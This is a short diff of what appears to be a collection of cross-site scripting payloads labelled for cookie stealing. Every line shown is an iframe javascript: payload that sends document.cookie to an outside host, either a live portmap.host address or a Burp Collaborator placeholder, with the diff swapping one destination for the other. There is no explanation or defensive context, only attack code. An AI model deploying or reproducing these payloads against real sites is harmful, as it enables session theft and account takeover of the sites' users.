@@ -5,11 +5,11 @@
 for cookia stelling
 <iframe src="javascript:let i=new Image;i.src='http://pip3lee101-64604.portmap.host:64604/?lee101'+document.cookie; console.log(document.cookie);" >
 
-<iframe src="javascript:fetch('http://pip3lee101-64604.portmap.host:64604/?lee101'+document.cookie', {
+<iframe src="javascript:fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
 method: 'GET',
 mode: 'no-cors',
 body:document.cookie
-}); alert(document.cookie);" >
+}); console.log(document.cookie);" >
 
 
 <script>
